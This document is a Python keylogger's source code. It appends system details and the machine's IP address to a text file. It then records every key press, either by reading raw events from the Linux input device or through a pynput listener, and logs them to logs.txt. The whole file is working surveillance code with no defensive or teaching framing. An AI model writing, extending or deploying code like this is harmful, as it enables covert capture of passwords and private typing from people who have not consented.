from multiprocessing import process
import struct
import os
import socket
import sys
import subprocess
import platform
import time
import threading

KEYCODE_MAP = {
    1: 'ESC', 2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7',
    9: '8', 10: '9', 11: '0', 12: '-', 13: '=', 14: 'BACKSPACE',
    15: 'TAB', 16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y',
    22: 'u', 23: 'i', 24: 'o', 25: 'p', 26: '[', 27: ']', 28: 'ENTER',
    29: 'CTRL', 30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h',
    36: 'j', 37: 'k', 38: 'l', 39: ';', 40: "'", 41: '`', 42: 'SHIFT',
    43: '\\', 44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n',
    50: 'm', 51: ',', 52: '.', 53: '/', 54: 'SHIFT', 57: 'SPACE',
    58: 'CAPSLOCK', 59: 'F1', 60: 'F2', 61: 'F3', 62: 'F4', 63: 'F5',
    64: 'F6', 65: 'F7', 66: 'F8', 67: 'F9', 68: 'F10', 87: 'F11', 88: 'F12'
}

def get_host_info():
    host_info = os.uname()
    with open('infos.txt', 'a') as infos:
        infos.write(f"Host: {host_info.nodename}\n")
        infos.write(f"System: {host_info.sysname}\n")
        infos.write(f"Release: {host_info.release}\n")
        infos.write(f"Version: {host_info.version}\n")
        infos.write(f"Machine: {host_info.machine}\n")
        infos.write(f"host ip: {socket.gethostbyname(socket.gethostname())}\n")
        infos.write("\n")

def find_keyboard_device():
    with open('/proc/bus/input/devices', 'r') as reader:   
        content = reader.read()
        blocks = content.split("\n\n")
        device = None
        for b in blocks:
            if "keyboard" in b.lower():
                for line in b.split('\n'):
                        if line.startswith('H:') and 'event' in line:
                            for part in line.split():
                                if part.startswith('event'):
                                    device = f"/dev/input/{part}"
                                    return device
                                

def keylog_linux():
    
    device = find_keyboard_device()
    if device is None:
        print("No keyboard device found.")
        return
    EVENT_FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(EVENT_FORMAT)
    print(f"Using device: {device}")
    with open(device, 'rb') as p:
        while True:
            data = p.read(EVENT_SIZE)
            if len(data) < EVENT_SIZE:
                continue
            _, _, ev_type, code, value = struct.unpack(EVENT_FORMAT, data) # the first two are l, l which are secs and microsecs, we ignore them 
            if ev_type == 1 and value == 1:  # Key press event
                with open('logs.txt', 'a') as logs:
                    logs.write(KEYCODE_MAP.get(code, f'UNKNOWN({code})'))
                    print(KEYCODE_MAP.get(code, f'UNKNOWN({code})'))
                    


def keylog(key):
    print(str(key))
    with open('logs.txt', 'a') as logs:
        try:
            if key == keyboard.Key.enter:
                logs.write("\n")
            elif key == keyboard.Key.space:
                logs.write(" ")
            else:
                logs.write(key.char)
        except:
            print("skipi abdsami3")
            pass

            
if __name__ == "__main__":
    get_host_info()
    if platform.system() == "Linux":
        if os.environ.get("XDG_SESSION_TYPE") == "wayland" or os.environ.get("DISPLAY") is None:
            keylog_linux()
        else:
            from pynput import keyboard 
            listener = keyboard.Listener(on_press=keylog)
            listener.start()
            listener.join()
    
    input()

    
    
    



    
    
    
    
    


